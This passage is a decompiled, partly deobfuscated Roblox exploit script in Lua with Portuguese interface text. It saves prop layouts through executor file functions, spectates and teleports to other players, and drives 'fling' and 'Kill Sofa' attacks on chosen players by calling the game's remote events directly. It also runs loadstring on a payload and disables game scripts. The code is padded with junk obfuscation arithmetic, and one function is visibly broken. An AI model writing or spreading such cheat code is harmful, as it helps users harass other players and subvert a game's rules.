local function payload_fn_673()
	upv1()
	upv2.CoquetteBuildLayout = nil
	upv3()
end

-- payload closure created 674-th (proto #456)
local function payload_fn_674(arg, arg2)
	local n2 = 618350211

	pcall(function()
		upv1:SetCore("SendNotification", { Title = arg, Text = arg2, Duration = 6 })
	end)
end

-- payload closure created 675-th (proto #454)
local function payload_fn_675(arg)
	return tostring(arg or ""):match("^%s*(.-)%s*$")
end

-- payload closure created 676-th (proto #t1036)
local function payload_fn_676(arg)
	return { arg:GetComponents() }
end

-- payload closure created 677-th (proto #t4122)
local function payload_fn_677(arg)
	if type(arg) ~= "table" or #arg ~= 12 then
		return nil
	end
	local tbl = {}

	for i = 1, 12 do
		tbl[i] = tonumber(arg[i])
		if not tbl[i] then
			return nil
		end
	end

	return CFrame.new(unpack(tbl))
end

-- payload closure created 678-th (proto #t6073)
local function payload_fn_678(arg)
	local n2 = 761539536

	local ok2, result2 = pcall(function()
		return arg:GetAttributes()
	end)

	local value = nil
	local value2 = nil

	if ok2 then
		value2 = nil
		value = nil

		for k, v in pairs(result2) do
			if type(v) == "string" then
				local str = tostring(k):lower()

				if not value2 and str:find("category", 1, true) then
					value2 = v
				else
					local flag = not value

					if flag then
						flag = str == "id" or str == "propname" or str == "itemname" or str == "originalname"
					end

					if flag then
						value = v
					end
				end
			end
		end
	end

	for _, descendant in ipairs(arg:GetDescendants()) do
		if descendant:IsA("StringValue") then
			local str = descendant.Name:lower()

			if not value2 and str:find("category", 1, true) then
				value2 = descendant.Value
			elseif not value and (str == "id" or str == "propname" or str == "itemname" or str == "originalname") then
				value = descendant.Value
			end
		end

		if not (value and value2) then
			continue
		end
		break
	end

	return value, value2
end

-- payload closure created 679-th (proto #t6550)
local function payload_fn_679()
	local flag = type(405258137) == "string"
	local n2 = 662079856

	local ok2, result2 = pcall(function()
		return require(upv1.Modules.Client.UI.LoadableEntries.Props)
	end)

	if not ok2 or type(result2) ~= "table" then
		return nil
	end
	local entries = result2.Entries or result2
	if type(entries) ~= "table" then
		return nil
	end
	local tbl = {}

	for _, entry in pairs(entries) do
		if type(entry) == "table" and entry.IsCategory == true and type(entry.Name) == "string" then
			tbl[entry.Name] = entry.Filter
		end
	end

	local tbl2 = {}

	for _, entry in pairs(entries) do
		if type(entry) == "table" and entry.IsCategory ~= true and type(entry.Name) == "string" and type(entry.Category) == "string" then
			tbl2[entry.Name] = { category = entry.Category, filter = entry.Filter or tbl[entry.Category] }
		end
	end

	return tbl2
end

-- payload closure created 680-th (proto #t5956)
local function payload_fn_680(arg, arg2)
	local v = upv1[arg]
	if v then
		return v.name, v.category, v.filter, v.hasFilter
	end
	local attribute = arg:GetAttribute("id")
	local flag = type(attribute) == "string" and arg2[attribute] or nil
	if flag then
		return attribute, flag.category, flag.filter, flag.filter ~= nil
	end
	local v2, v3 = upv2(arg)
	local v4 = v2 and arg2[v2]
	if v4 then
		return v2, v4.category, v4.filter, v4.filter ~= nil
	end

	if v2 and v3 then
		return v2, v3, nil, false
	end
	return nil, nil
end

-- payload closure created 681-th (proto #t5505)
local function payload_fn_681(arg)
	local n2 = 145971976

	local attribute = arg:GetAttribute("CurrentColor")
	;(nil)(attribute)
	if nil == "Color3" then
		return { attribute.R, attribute.G, attribute.B }
	end
	;(nil)(attribute)

	if nil == "string" then
		local tbl = {}
		local v = table.pack((nil)(attribute, "[-+]?[%d%.]+"))

		for k in nil, v[2], v[3] do
			tbl[#tbl + 1] = tonumber(k)
		end

		if nil then
			return { tbl[1], tbl[2], tbl[3] }
		end
	end

	arg:IsA("BasePart")

	if not nil then
		arg:FindFirstChildWhichIsA("BasePart", true)
	end

	if not nil then
		return nil
	end
	local tbl = {}
	local r = (nil).Color.R
	local g = (nil).Color.G
	local b = (nil).B
	tbl[1] = r
	tbl[2] = g
	tbl[3] = b
	return tbl
end

-- payload closure created 682-th (proto #t1180)
local function payload_fn_682(arg)
	local n2 = 690775650

	local ok2, result2 = pcall(function()
		return arg:GetScale()
	end)

	return ok2 and tonumber(result2) or nil
end

-- payload closure created 683-th (proto #452)
local function payload_fn_683(arg, arg2)
	local n2 = 403152937

	if arg2 + 243014036 == 113262835 then
	end

	local v = type
	local v2 = isfile
	local v3 = table.pack(bit32.band(n2, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n3 = bit32.band(53859 * v4[1] + bit32.lshift(bit32.band(53859 * bit32.rshift(v3[1], 16) + 15336 * v4[1], 65535), 16), 4294967295) + 1312614977
	local v5 = table.pack(bit32.band(bit32.bor(380280843, n2), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(23354 * v6[1] + bit32.lshift(bit32.band(23354 * bit32.rshift(v5[1], 16) + 34862 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.bxor(n2, 380280843), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n4 = n3 + v7 + bit32.band(53860 * v9[1] + bit32.lshift(bit32.band(53860 * bit32.rshift(v8[1], 16) + 15336 * v9[1], 65535), 16), 4294967295)
	local flag = v(v2) ~= "function"
	local v10 = bit32.bxor(n4, 72175318)
	if flag or type(readfile) ~= "function" or not isfile(upv1) then
		return
	end

	local ok2, result2 = pcall(function()
		return upv2:JSONDecode(readfile(upv1))
	end)

	if ok2 and type(result2) == "table" and type(result2.layouts) == "table" then
		upv3 = result2.layouts
	end
end

-- payload closure created 684-th (proto #t1099)
local function payload_fn_684()
	local n2 = 8751890291
	if type(writefile) ~= "function" then
		return false, "Seu executor não possui suporte para salvar arquivos."
	end
	local v = pcall
	local v2 = bit32.bxor(n2, 52981102)

	local v3, v4 = v(function()
		return upv1:JSONEncode({ version = 1, layouts = upv2 })
	end)

	if not v3 then
		return false, "Não foi possível preparar o salvamento."
	end

	if not pcall(writefile, upv3, v4) then
		return false, "Não foi possível gravar o salvamento."
	end
	return true
end

-- payload closure created 685-th (proto #458)
local function payload_fn_685()
	local flag = type(381209282) == "nil"
	local tbl = {}
	local n2 = 36846067

	for k in pairs(upv1) do
		tbl[#tbl + 1] = k
	end

	local sort = table.sort
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local n3 = bit32.band(21826 * v2[1] + bit32.lshift(bit32.band(21826 * bit32.rshift(v[1], 16) + 3967 * v2[1], 65535), 16), 4294967295) + 3568664512
	local v3 = table.pack(bit32.band(bit32.bor(n2, 114004960), 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local v5 = bit32.band(43711 * v4[1] + bit32.lshift(bit32.band(43711 * bit32.rshift(v3[1], 16) + 61568 * v4[1], 65535), 16), 4294967295)
	local v6 = table.pack(bit32.band(bit32.band(n2, 114004960), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local n4 = n3 + v5 + bit32.band(43709 * v7[1] + bit32.lshift(bit32.band(43709 * bit32.rshift(v6[1], 16) + 61568 * v7[1], 65535), 16), 4294967295)

	sort(tbl, function(arg, arg2)
		return arg:lower() < arg2:lower()
	end)

	if #tbl == 0 then
		tbl[1] = "Nenhum salvamento"
	end

	return tbl
end

-- payload closure created 686-th (proto #t6672)
local function payload_fn_686()
	upv1 = nil

	if upv2 then
		local flag = type(0) == "function"
		local n2 = 88754912

		pcall(function()
			upv2:Set(upv3())
		end)
	end
end

-- payload closure created 687-th (proto #t5929)
local function payload_fn_687(arg)
	local str = arg:lower()

	for k in pairs(upv1) do
		if k:lower() == str then
			return k
		end
	end

	return nil
end

-- payload closure created 688-th (proto #t2833)
local function payload_fn_688(arg)
	local n2 = 0
	local n3 = 0
	local huge = math.huge

	for _, v in ipairs(arg) do
		local pivot = v:GetPivot()
		local n4 = 9076217728
		n2 += pivot.Position.X
		n3 += pivot.Position.Z

		local ok2, result2, result3 = pcall(function()
			return v:GetBoundingBox()
		end)

		local y = ok2 and result2.Position.Y - result3.Y / 2 or pivot.Position.Y
		huge = math.min(huge, y)
	end

	return CFrame.new(n2 / #arg, huge, n3 / #arg)
end

-- payload closure created 689-th (proto #455)
local function payload_fn_689()
	local n2 = 2524407699
	local n3 = 3935147611
	local v = upv1(upv2)
	if v == "" then
		upv3("Salvamentos de props", "Digite um nome para o salvamento.")
		return
	end
	local v2 = upv4()
	if #v2 == 0 then
		upv3("Salvamentos de props", "Você não possui props colocados no mapa.")
		return
	end
	local v3 = upv5()
	if not v3 then
		upv3("Erro", "Não foi possível carregar o catálogo de props.")
		return
	end
	local v4 = upv6(v2)
	local props = {}
	local n4 = 0

	for _, v5 in ipairs(v2) do
		local v6, v7, v8, v9 = upv7(v5, v3)

		if v6 and v7 then
			local pivot = v5:GetPivot()

			props[#props + 1] = {
				name = v6,
				category = v7,
				filter = v8,
				hasFilter = v9,
				absolute = upv8(pivot),
				relative = upv8(v4:ToObjectSpace(pivot)),
				color = upv9(v5),
				scale = upv10(v5),
			}
		else
			n4 += 1
		end
	end

	if #props == 0 then
		upv3("Salvamentos de props", "Os props atuais não foram reconhecidos.")
		return
	end
	local v5 = upv11(v)
	local v6 = v5 and upv12[v5] or nil
	local v7 = upv12[v]
	local flag

	if v5 then
		flag = v5 ~= v
		n2 = bit32.bor(n2, n3) - 1753780296
	else
		flag = v5
	end

	if flag then
		upv12[v5] = nil
	end

	local v8 = upv12
	local tbl = {}
	local v9 = os
	tbl.savedAt = v9.time()
	tbl.props = props
	v8[v] = tbl
	local v10, v11 = upv13()

	if not v10 then
		upv12[v] = v7

		if v5 and v5 ~= v then
			upv12[v5] = v6
		end

		upv3("Erro", v11)
		return
	end

	upv14()
	upv3("Props salvos", tostring(#props) .. " prop(s) salvos em '" .. v .. "'." .. (n4 > 0 and " " .. n4 .. " não identificado(s) foram ignorados." or ""))
end

-- payload closure created 690-th (proto #t8280)
local function payload_fn_690(arg)
	local n2 = 2380165478
	local lookVector = arg.rootPart.CFrame.LookVector
	local vector_ = Vector3.new(lookVector.X, 0, lookVector.Z)
	local unit = vector_.Magnitude > 0.001 and vector_.Unit or Vector3.new(0, 0, -1)
	local n3 = arg.rootPart.Position + unit * 10
	local raycastParams = RaycastParams.new()
	raycastParams.FilterType = Enum.RaycastFilterType.Exclude
	raycastParams.FilterDescendantsInstances = { arg.character, upv1() }
	local hit = workspace:Raycast(n3 + Vector3.new(0, 10, 0), Vector3.new(0, -40, 0), raycastParams)
	hit = hit and hit.Position

	if not hit then
		local vector_2 = Vector3.new
		local x = n3.X
		local n4 = arg.rootPart.Position.Y - 3
		local z = n3.Z
		hit = vector_2(x, n4, z)
	end

	return CFrame.lookAt(hit, hit + unit)
end

-- payload closure created 691-th (proto #462)
local function payload_fn_691(arg)
	local n2 = 1375006473
	local n3 = 1719792819
	local n4 = 2490999625
	if upv1 or upv2 then
		return
	end
	local v = upv3
	local v2 = upv3

	if v then
		v2 = upv4[v]
	end

	local flag = not v2 or type(v2.props) ~= "table"

	if not flag then
		n2 = n3
		flag = #v2.props == 0
	end

	if flag then
		upv5("Salvamentos de props", "Selecione um salvamento no dropdown.")
		return
	end
	upv1 = true
	upv6()
	upv7.CoquetteBuildLayout = nil
	local v3 = upv8()

	if not v3 then
		upv1 = false
		upv5("Erro", "Não foi possível preparar o PropMaker.")
		return
	end

	local v4 = upv9(v3)
	local flag2 = arg == "front" and v4 or nil
	local v5 = ipairs
	local props = v2.props
	local v6 = table.pack(bit32.band(n4, 4294967295))
	local v7 = table.pack(bit32.band(n3, 4294967295))
	local v8 = table.pack(bit32.band(v6[1], 65535))
	local v9 = table.pack(bit32.rshift(v6[1], 16))
	local v10 = table.pack(bit32.band(v7[1], 65535))
	bit32.band(v8[1] * v10[1] + bit32.lshift(bit32.band(v8[1] * bit32.rshift(v7[1], 16) + v9[1] * v10[1], 65535), 16), 4294967295)
	local n5 = 0

	for _, prop in v5(props) do
		local flag3 = arg == "front" and upv10(prop.relative) or upv10(prop.absolute)
		local n6

		if flag3 then
			n6 = flag2 and flag2 * flag3 or flag3
		else
			n6 = flag3
		end

		if n6 and type(prop.name) == "string" and type(prop.category) == "string" then
			local v11 = upv11(v3, prop.name, prop.category, v4.Position, prop.filter, prop.hasFilter == false)

			if v11 then
				local v12 = upv12
				local tbl = { name = prop.name, category = prop.category, filter = prop.filter }
				local hasFilter = prop.hasFilter
				local v13 = table.pack(bit32.band(n5, 4294967295))
				local v14 = table.pack(bit32.band(v13[1], 65535))
				local v15 = bit32.band(1397 * v14[1] + bit32.lshift(bit32.band(1397 * bit32.rshift(v13[1], 16) + 39439 * v14[1], 65535), 16), 4294967295)
				local v16 = table.pack(bit32.band(bit32.bnot(n5), 4294967295))
				local v17 = table.pack(bit32.band(v16[1], 65535))
				local n7 = 3088257192 + v15 + bit32.band(1397 * v17[1] + bit32.lshift(bit32.band(1397 * bit32.rshift(v16[1], 16) + 39439 * v17[1], 65535), 16), 4294967295)
				tbl.hasFilter = hasFilter
				v12[v11] = tbl
				local n8 = n7 + 27150540
				local setCurrentScale = v11:FindFirstChild("SetCurrentScale")

				if setCurrentScale and type(prop.scale) == "number" then
					pcall(setCurrentScale.InvokeServer, setCurrentScale, prop.scale)
				end

				if pcall(function()
					v11.SetCurrentCFrame:InvokeServer(n6)
				end) then
					n5 += 1
				end

				if type(prop.color) == "table" and #prop.color >= 3 then
					local changePropColor = v11:FindFirstChild("ChangePropColor")

					if changePropColor then
						pcall(changePropColor.InvokeServer, changePropColor, Color3.new(prop.color[1], prop.color[2], prop.color[3]))
					end
				end
			end
		end

		task.wait(0.15)
	end

	upv1 = false
	upv5("Props colocados", tostring(n5) .. " de " .. tostring(#v2.props) .. " prop(s) foram colocados.")
end

-- payload closure created 692-th (proto #453)
local function payload_fn_692(arg)
	upv2 = upv1(arg)
end

-- payload closure created 695-th (proto #459)
local function payload_fn_695(arg)
	local str = tostring(arg or "")
	upv2 = upv1[str] and str or nil
end

-- payload closure created 696-th (proto #460)
local function payload_fn_696()
	local v = upv1
	if not v or not upv2[v] then
		upv3("Salvamentos de props", "Selecione um salvamento no dropdown.")
		return
	end
	local v2 = upv2[v]
	upv2[v] = nil
	local v3, v4 = upv4()

	if not v3 then
		upv2[v] = v2
		upv3("Erro", v4)
		return
	end

	upv5()
	upv3("Salvamentos de props", "Salvamento '" .. v .. "' excluído.")
end

-- payload closure created 697-th (proto #461)
local function payload_fn_697()
	task.spawn(upv1, "absolute")
end

-- payload closure created 698-th (proto #463)
local function payload_fn_698()
	task.spawn(upv1, "front")
end

-- payload closure created 699-th (proto #464)
local function payload_fn_699(arg)
	upv1(arg == "Suave")
end

-- payload closure created 700-th (proto #466)
local function payload_fn_700()
	task.spawn(upv1, upv2.robot)
end

-- payload closure created 702-th (proto #472)
local function payload_fn_702()
	task.spawn(upv1, upv2.robot2)
end

-- payload closure created 703-th (proto #474)
local function payload_fn_703(arg)
	upv1(arg)
end

-- payload closure created 704-th (proto #483)
local function payload_fn_704()
	task.spawn(upv1)
end

-- payload closure created 705-th (proto #505)
local function payload_fn_705(arg)
	upv1 = arg
	local n2 = 454171570
	local character = upv2.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		return
	end

	pcall(function()
		humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, not arg)

		if arg then
			humanoid.Sit = false
			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
		end
	end)
end

-- payload closure created 706-th (proto #485)
local function payload_fn_706()
	loadstring(upv1)()
end

-- payload closure created 707-th (proto #516)
local function payload_fn_707()
	local carClient = upv1:WaitForChild("Backpack"):FindFirstChild("CarClient")

	if carClient and carClient:IsA("LocalScript") then
		carClient.Disabled = true
	end
end

-- payload closure created 708-th (proto #t8055)
local function payload_fn_708()
	local carClient = upv1:WaitForChild("Backpack"):FindFirstChild("CarClient")

	if carClient and carClient:IsA("LocalScript") then
		carClient.Disabled = false
	end
end

-- payload closure created 709-th (proto #486)
local function payload_fn_709()
	local tbl = {}

	for _, player in ipairs(upv1:GetPlayers()) do
		if player ~= upv2 then
			table.insert(tbl, player.Name)
		end
	end

	return tbl
end

-- payload closure created 710-th (proto #495)
local function payload_fn_710(arg, arg2)
	local n2 = 9037365953

	pcall(function()
		local n3 = 3516039665
		local v = bit32.bxor(n2, 4031499970)
		local n4 = 3283999917
		local v2 = arg:Get()
		local v3 = upv1()
		arg:Set(v3)

		if v2 and not table.find(v3, v2) then
			arg:Set("")
			upv2 = nil

			if upv3 then
				local v4 = stopSpectating
				v4()

				if arg2 then
					local n5 = 1035800515

					pcall(function()
						arg2:Set(false)
					end)
				end
			end

			if upv4 or upv5 or upv6 then
				upv4 = false
				upv5 = false
				upv6 = false

				if upv7 then
					upv7:Disconnect()
					upv7 = nil
				end

				flingConnection:Disconnect()
				flingConnection = nil

				if upv8 then
					local flag = bit32.bxor(bit32.bxor(n2, 0), 276603423) ~= 181919966
					local n5 = 8883944141

					pcall(function()
						upv8:Set(false)
					end)
				end

				upv9(false)
			end
		elseif v2 and table.find(v3, v2) then
			arg:Set(v2)
		end
	end)
end

-- payload closure created 711-th (proto #492)
local function payload_fn_711(arg)
	if upv1 then
		upv1:Disconnect()
		upv1 = nil
	end

	local v = upv2:FindFirstChild(arg)

	if v and v ~= upv3 then
		upv4 = v
		upv5 = true
		local n2 = 8837895174

		local function fn()
			if not upv5 or not upv4 then
				return
			end

			if upv4.Character and upv4.Character:FindFirstChild("Humanoid") then
				upv6.CurrentCamera.CameraSubject = upv4.Character.Humanoid
			else
				upv6.CurrentCamera.CameraSubject = nil
			end
		end

		fn()

		upv1 = upv7.Heartbeat:Connect(function()
			if not upv5 then
				upv1:Disconnect()
				upv1 = nil
				return
			end

			pcall(fn)
		end)

		upv4.CharacterAdded:Connect(function()
			if upv5 then
				fn()
			end
		end)
	else
		upv5 = false
		upv4 = nil
	end
end

-- payload closure created 712-th (proto #494)
local function payload_fn_712()
	if upv1 then
		upv1:Disconnect()
		upv1 = nil
	end

	upv2 = false
	upv3 = nil

	if upv4.Character and upv4.Character:FindFirstChild("Humanoid") then
		upv5.CurrentCamera.CameraSubject = upv4.Character.Humanoid
		upv5.CurrentCamera.CameraType = Enum.CameraType.Custom
	else
		upv5.CurrentCamera.CameraSubject = nil
		upv5.CurrentCamera.CameraType = Enum.CameraType.Custom
	end
end

-- payload closure created 713-th (proto #t8965)
local function payload_fn_713(arg)
	local n2 = 2537086831
	local n3 = 1894470342
	local v = upv1:FindFirstChild(arg)

	if v and upv2.Character and upv2.Character:FindFirstChild("HumanoidRootPart") and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
		local n4 = 381655213
		local humanoidRootPart = upv2.Character:FindFirstChild("HumanoidRootPart")
		local character = upv2.Character
		local v2 = bit32.bxor(n2, n3)
		local humanoid = character:FindFirstChild("Humanoid")
		if not humanoidRootPart or not humanoid then
			return
		end
		local v3 = ipairs
		local character2 = upv2.Character
		local v4 = table.pack(bit32.band(n4, 4294967295))
		local v5 = table.pack(bit32.band(v4[1], 65535))
		local n5 = bit32.band(56086 * v5[1] + bit32.lshift(bit32.band(56086 * bit32.rshift(v4[1], 16) + 19407 * v5[1], 65535), 16), 4294967295) + 1217606390
		local v6 = table.pack(bit32.band(bit32.bor(n4, 514679249), 4294967295))
		local v7 = table.pack(bit32.band(v6[1], 65535))
		local v8 = bit32.band(9451 * v7[1] + bit32.lshift(bit32.band(9451 * bit32.rshift(v6[1], 16) + 46128 * v7[1], 65535), 16), 4294967295)
		local v9 = table.pack(bit32.band(bit32.band(n4, 514679249), 4294967295))
		local v10 = table.pack(bit32.band(v9[1], 65535))
		local n6 = n5 + v8 + bit32.band(9449 * v10[1] + bit32.lshift(bit32.band(9449 * bit32.rshift(v9[1], 16) + 46128 * v10[1], 65535), 16), 4294967295)

		for _, descendant in v3(character2:GetDescendants()) do
			if descendant:IsA("BasePart") then
				descendant.Velocity = Vector3.zero
				descendant.RotVelocity = Vector3.zero
				descendant.Anchored = true
			end
		end

		if not pcall(function()
			humanoidRootPart.CFrame = CFrame.new(v.Character.HumanoidRootPart.Position + Vector3.new(0, 2, 0))
		end) then
			return
		end
		humanoid.Sit = false
		humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
		task.wait(0.5)

		for _, descendant in ipairs(upv2.Character:GetDescendants()) do
			if descendant:IsA("BasePart") then
				descendant.Anchored = false
				descendant.Velocity = Vector3.zero
				descendant.RotVelocity = Vector3.zero
			end
		end

	end
end

-- payload closure created 714-th (proto #772)
local function payload_fn_714()
	if upv1 then
		local flag = type(440454550) == "function"
		upv2()
		local n2 = 8671708126

		pcall(function()
			SpectateToggletrollTab:Set(false)
		end)
	end
end

-- payload closure created 715-th (proto #487)
local function payload_fn_715(arg)
	upv1 = arg
	local flag = arg == "" or arg == nil

	if flag then
		upv2 = nil
		local v = upv3
		local v2

		if upv3 then
			v2 = v
		else
			v2 = upv4
		end

		if v2 or upv5 then
			upv3 = false
			upv4 = false
			upv5 = false

			if upv6 then
				upv6:Disconnect()
			end

			flingConnection:Disconnect()

			if upv7 then
				local n2 = 236706517


				local n3 = n2 + 51772653

				pcall(function()
					upv7:Set(false)
				end)
			end

			upv8(false)
		end

		if upv9 then
			upv10()
		end
	else
		upv2 = upv11:FindFirstChild(arg)

		if upv9 then
			upv10()
			upv12(arg)
		end
	end
end

-- payload closure created 716-th (proto #489)
local function payload_fn_716()
	local tbl = {}

	for _, player in ipairs(upv1:GetPlayers()) do
		if player.Name ~= upv2.Name then
			table.insert(tbl, player.Name)
		end
	end

	upv3:Set(tbl)
end

-- payload closure created 717-th (proto #488)
local function payload_fn_717()
	UptadePlayers()
end

-- payload closure created 718-th (proto #490)
local function payload_fn_718()
	local v = upv1
	local flag = upv1

	if v then
		flag = v ~= ""
	end

	if flag then
		pcall(upv2, v)
	end
end

-- payload closure created 719-th (proto #491)
local function payload_fn_719(arg)
	if arg then
		if upv1 then
			pcall(upv2, upv1.Name)
		else
			SpectateTogglecreditoscreditosTab:Set(false)
		end
	else
		pcall(upv3)
	end
end

-- payload closure created 723-th (proto #775)
local function payload_fn_723(arg)
	upv1(upv2, upv3)

	if upv4 == arg then
		upv4 = nil

		if upv5 then
			upv6()
		end

		if upv7 then
			upv7 = false

			if upv8 then
				upv8:Disconnect()
				upv8 = nil
			end

			flingConnection:Disconnect()
			flingConnection = nil

			if upv9 then
				upv9:Set(false)
			end
		end

		upv3:Set(false)
		upv2:Set("")
	end
end

-- payload closure created 724-th (proto #776)
local function payload_fn_724()
	task.wait(1)
	upv1(upv2, upv3)
end

-- payload closure created 726-th (proto #497)
local function payload_fn_726(arg)
	upv1 = arg or "Player"
	upv2 = nil

	if upv3 then
		local flag = type(38057990) == "vector"
		local flag2 = upv1 == "All"
		local n2 = 339342957
		flag2 = flag2 and { "Sofá", "Ônibus", "Gyrosphere", "Bola (Fling)", "Barco (fling)" } or { "Sofá", "Ônibus", "Gyrosphere" }
		local n3 = n2 - 281527367

		pcall(function()
			upv3:Set(flag2)
		end)
	end
end

-- payload closure created 727-th (proto #498)
local function payload_fn_727()
	local tbl = {}
	local coquetteAllWhitelist = getgenv().CoquetteAllWhitelist
	local n2 = 471639239

	for _, player in ipairs(upv1:GetPlayers()) do
		if player ~= upv2 then
			table.insert(tbl, (table.find(coquetteAllWhitelist, player) and "✓ " or "") .. player.Name)
		end
	end

	table.sort(tbl, function(arg, arg2)
		return arg:gsub("^✓%s*", ""):lower() < arg2:gsub("^✓%s*", ""):lower()
	end)

	return tbl
end

-- payload closure created 729-th (proto #499)
local function payload_fn_729(arg)
	if not arg or arg == "" then
		return
	end
	local str = tostring(arg):gsub("^✓%s*", "")
	local v = upv1:FindFirstChild(str)
	if not v or v == upv2 then
		return
	end
	local coquetteAllWhitelist = getgenv().CoquetteAllWhitelist
	local v2 = table.find(coquetteAllWhitelist, v)

	if v2 then
		table.remove(coquetteAllWhitelist, v2)
	else
		table.insert(coquetteAllWhitelist, v)
	end

	upv3()
end

-- payload closure created 730-th (proto #t7167)
local function payload_fn_730()
	if upv1 then
		local n2 = 489325990

		pcall(function()
			upv1:Set(upv2())
		end)
	end
end

-- payload closure created 731-th (proto #777)
local function payload_fn_731()
	task.delay(0.5, upv1)
end

-- payload closure created 732-th (proto #778)
local function payload_fn_732(arg)
	local coquetteAllWhitelist = getgenv().CoquetteAllWhitelist
	local v = table.find(coquetteAllWhitelist, arg)

	if v then
		table.remove(coquetteAllWhitelist, v)
	end

	task.defer(upv1)
end

-- payload closure created 733-th (proto #500)
local function payload_fn_733(arg)
	upv1 = arg
end

-- payload closure created 734-th (proto #t5333)
local function payload_fn_734()
	local n2 = 3220997292
	local n3 = 1704465945
	local n4 = 127217512
	local backpack = upv1:WaitForChild("Backpack")
	local couch_ = backpack:FindFirstChild("Couch")
	local couch_2

	if couch_ then
		couch_2 = couch_
	else
		couch_2 = upv1.Character and upv1.Character:FindFirstChild("Couch")
	end

	local v

	if not couch_2 then
		local n5 = 387692153
		local tbl = { "PickingTools", "Couch" }

		pcall(function()
			upv2:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(tbl))
		end)

		local now = tick()
		local couch_3

		while true do
			couch_3 = backpack:FindFirstChild("Couch")
			task.wait(0.05)
			if not (couch_3 or tick() - now > 1.5) then
				continue
			end
			break
		end

		if not couch_3 then
			return false
		end
		v = couch_3
	else
		v = couch_2
	end

	v.Parent = upv1.Character
	local v2 = table.pack(bit32.band(n4, 4294967295))
	local v3 = table.pack(bit32.band(n3, 4294967295))
	local v4 = table.pack(bit32.band(v2[1], 65535))
	local v5 = table.pack(bit32.rshift(v2[1], 16))
	local v6 = table.pack(bit32.band(v3[1], 65535))
	bit32.band(v4[1] * v6[1] + bit32.lshift(bit32.band(v4[1] * bit32.rshift(v3[1], 16) + v5[1] * v6[1], 65535), 16), 4294967295)
	local now = tick()
	local couch_3

	while true do
		couch_3 = upv1.Character and upv1.Character:FindFirstChild("Couch")

		if not couch_3 then
			couch_3 = backpack:FindFirstChild("Couch")

			if couch_3 then
				couch_3.Parent = upv1.Character
			end
		end

		task.wait(0.05)
		if not (couch_3 or tick() - now > 1) then
			continue
		end
		break
	end

	return couch_3
end

-- payload closure created 735-th (proto #t9436)
local function payload_fn_735(arg)
	if not arg then
		return nil
	end

	if arg:IsA("BasePart") then
		return arg
	end
	return arg:FindFirstChild("Handle", true) or arg:FindFirstChildWhichIsA("BasePart", true)
end

-- payload closure created 736-th (proto #t266)
local function payload_fn_736(arg, arg2)
	local n2 = 2574502177
	local n3 = 2292181609
	local n4 = 48158969
	local lowerTorso = arg:FindFirstChild("LowerTorso")
	local upperTorso = arg:FindFirstChild("UpperTorso")

	if lowerTorso and lowerTorso:IsA("BasePart") then
		local n5 = lowerTorso.Position.Y + lowerTorso.Size.Y * 0.18
		local v

		if upperTorso and upperTorso:IsA("BasePart") then
			local v2 = math
			v = v2.min(n5, upperTorso.Position.Y - upperTorso.Size.Y * 0.28)
		else
			v = n5
		end

		return v
	end

	local torso = arg:FindFirstChild("Torso")
	if torso and torso:IsA("BasePart") then
		return torso.Position.Y - torso.Size.Y * 0.18
	end
	return arg2.Position.Y
end

-- payload closure created 737-th (proto #t11)
local function payload_fn_737(arg)
	if not arg or not arg.Character or not upv1.Character then
		return
	end
	local humanoid = arg.Character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		return
	end

	if humanoid.Sit then
		local n2 = 4375354372

		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", { Title = "Kill Sofa", Text = "O jogador esta sentado em algo.", Duration = 3 })
		end)

		return
	end

	local v = upv2()
	if not v then
		return
	end
	task.wait(0.2)
	local humanoidRootPart = upv1.Character and upv1.Character:FindFirstChild("HumanoidRootPart")
	local v2 = upv3(v)
	if not humanoidRootPart or not v2 then
		return
	end
	upv4 = humanoidRootPart.Position
	upv5 = humanoidRootPart.CFrame:ToObjectSpace(v2.CFrame)
	upv6 = os.clock()
	upv7 = v2
	upv8(true)
	upv9 = true
end

-- payload closure created 738-th (proto #t8848)
local function payload_fn_738(arg)
	if not arg or not arg.Character or not upv1.Character then
		return
	end
	local str = "FindFirstChildOfClass"
	local humanoid = arg.Character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		return
	end

	if humanoid.Sit then
		local n2 = 784528176

		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", { Title = "Puxar Sofa", Text = "O jogador esta sentado em algo.", Duration = 3 })
		end)

		return
	end

	local v = upv2()
	if not v then
		return
	end
	task.wait(0.2)
	local humanoidRootPart = upv1.Character and upv1.Character:FindFirstChild("HumanoidRootPart")
	local v2 = upv3(v)
	if not humanoidRootPart or not v2 then
		return
	end
	upv4 = humanoidRootPart.Position
	upv5 = humanoidRootPart.CFrame:ToObjectSpace(v2.CFrame)
	upv6 = os.clock()
	upv7 = v2
	upv8(true)
	upv9 = true
end

-- payload closure created 739-th (proto #t9001)
local function payload_fn_739()
	local playersBag = upv1:FindFirstChild("PlayersBag")
	playersBag = playersBag and playersBag:FindFirstChild("LockUnlockVehicles")
	return playersBag ~= nil and playersBag.Value == true
end

-- payload closure created 740-th (proto #t595)
local function payload_fn_740(arg)
	local flag = type(0) == "boolean"
	local n2 = 547643073
	if upv1.isLocked() == arg then
		return
	end

	pcall(function()
		upv2:WaitForChild("RE"):WaitForChild("1Ke1yFa1b"):InvokeServer("LockUnlockVehicles")
	end)
end

-- payload closure created 741-th (proto #t2275)
local function payload_fn_741(arg)
	local spawnPoint = upv1.SPAWN_POINT
	local n2 = 134719767

	local ok2, result2 = pcall(function()
		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		local filterDescendantsInstances = {}
		local v = table.pack(upv2:FindFirstChild("Vehicles"))
		filterDescendantsInstances[1] = arg

		do
